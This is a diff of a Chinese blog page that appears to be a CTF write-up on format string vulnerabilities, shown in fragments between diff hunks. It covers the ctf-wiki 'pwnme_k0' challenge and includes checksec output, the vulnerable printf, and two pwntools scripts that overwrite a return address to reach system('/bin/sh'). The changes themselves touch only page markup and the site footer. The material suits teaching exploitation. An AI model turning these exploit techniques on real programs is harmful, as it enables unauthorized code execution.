 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/</a>三个白帽-pwnme_k0</p>
 <p>checksek一下：</p>
-<div class="highlight" id="id-25"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">hacker</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">challenges</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">fmtstr</span><span class="o">/</span><span class="err">三个白帽</span><span class="o">-</span><span class="n">pwnme_k0</span><span class="err">$</span> <span class="n">checksec</span> <span class="n">pwnme_k0</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">hacker</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">challenges</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">fmtstr</span><span class="o">/</span><span class="err">三个白帽</span><span class="o">-</span><span class="n">pwnme_k0</span><span class="err">$</span> <span class="n">checksec</span> <span class="n">pwnme_k0</span>
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hacker</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">challenges</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">fmtstr</span><span class="o">/</span><span class="err">\</span><span class="n">xe4</span><span class="err">\</span><span class="n">xb8</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe4</span><span class="err">\</span><span class="n">xb8</span><span class="err">\</span><span class="n">xaa</span><span class="err">\</span><span class="n">xe7</span><span class="err">\</span><span class="n">x99</span><span class="err">\</span><span class="n">xbd</span><span class="err">\</span><span class="n">xe5</span><span class="err">\</span><span class="n">xb8</span><span class="err">\</span><span class="n">xbd</span><span class="o">-</span><span class="n">pwnme_k0</span><span class="o">/</span><span class="n">pwnme_k0</span><span class="err">&#39;</span>
 </span></span><span class="line"><span class="cl">    <span class="nl">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
 </span></span><span class="line"><span class="cl">    <span class="nl">RELRO</span><span class="p">:</span>    <span class="n">Full</span> <span class="n">RELRO</span>
 </span></span><span class="line"><span class="cl">    <span class="nl">Stack</span><span class="p">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
 </span></span><span class="line"><span class="cl">    <span class="nl">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
 </span></span><span class="line"><span class="cl">    <span class="nl">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="nf">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span></span></span></code></pre></div><p>程序的大致就是注册账户之类的，下面代码存在漏洞：</p>
-<div class="highlight" id="id-26"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">sub_400B07</span><span class="p">(</span><span class="kt">char</span> <span class="n">format</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a4</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a5</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a6</span><span class="p">,</span> <span class="kt">char</span> <span class="n">formata</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a8</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a9</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">sub_400B07</span><span class="p">(</span><span class="kt">char</span> <span class="n">format</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a4</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a5</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a6</span><span class="p">,</span> <span class="kt">char</span> <span class="n">formata</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a8</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a9</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Welc0me to sangebaimao!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mh">0x1AuLL</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">formata</span><span class="p">,</span> <span class="s">&#34;Welc0me to sangebaimao!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">printf</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a9</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>看了字符串发现有可以直接利用的system(&rsquo;/bin/sh&rsquo;),所以只要用格式化字符串漏洞直接修改某个函数的返回地址为0x4008A6就可以了。</p>
-<div class="highlight" id="id-27"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004008</span><span class="nf">A6</span> <span class="no">sub_4008A6</span>      <span class="no">proc</span> <span class="no">near</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004008</span><span class="nf">A6</span> <span class="no">sub_4008A6</span>      <span class="no">proc</span> <span class="no">near</span>
 </span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004008</span><span class="nf">A6</span> <span class="c1">; __unwind {
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">00000000004008</span><span class="nf">A6</span>                 <span class="no">push</span>    <span class="no">rbp</span>
 </span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000004008</span><span class="nf">A7</span>                 <span class="no">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
@@ -786,7 +815,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>那么这道题中payl
 <p>然后就可以去覆盖这个地址存放的返回值为我们的system(‘/bin/sh’)即0x4008A6，即需要把400D74覆盖成4008A6，即：写成0x08A6 = 2214。</p>
 <p>这里需要说明的是在某些较新的系统 (如 ubuntu 18.04) 上, 直接修改返回地址为 0x00000000004008A6 时可能会发生程序 crash, 这时可以考虑修改返回地址为 0x00000000004008AA, 即直接调用 system(&quot;/bin/sh&quot;) 处，即2218</p>
 <p>exp1：通过把 username 改成计算出来的 ret 的地址</p>
-<div class="highlight" id="id-30"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./pwnme_k0&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="c1">##get retaddr</span>
@@ -808,7 +837,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>那么这道题中payl
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><p>Exp2：在 password 后面跟上 ret 地址来修改</p>
-<div class="highlight" id="id-31"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwnme_k0&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwnme_k0&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
@@ -837,9 +866,9 @@ fmtstr_payload函数返回的就是payload</code></pre><p>那么这道题中payl
           </div></div><div class="post-info-line">
         <div class="post-info-md"></div>
         <div class="post-info-share">
-          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/" data-title="格式化字符串漏洞举例" data-hashtags=""><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
-  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/" data-hashtag="[PWN]"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
-  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/" data-title="格式化字符串漏洞举例"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="http://ghostasky.github.io/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/" data-title="格式化字符串漏洞举例" data-hashtags=""><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://ghostasky.github.io/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/" data-hashtag="[PWN]"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://ghostasky.github.io/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/" data-title="格式化字符串漏洞举例"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
   </span>
         </div>
       </div></div>
@@ -858,14 +887,14 @@ fmtstr_payload函数返回的就是payload</code></pre><p>那么这道题中payl
 
   <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
       <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
-    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.8-RC"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
         </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
             <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
-              <a href="/"></a></span></div></div>
+              <a href="/">Ghostasky</a></span></div></div>
   </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
         </div></div><div id="mask"></div><noscript>
-    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
   </noscript>
 </div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
-    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js" defer></script></body>
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.8-RC"};</script><script src="/js/theme.min.js" defer></script></body>
 </html>
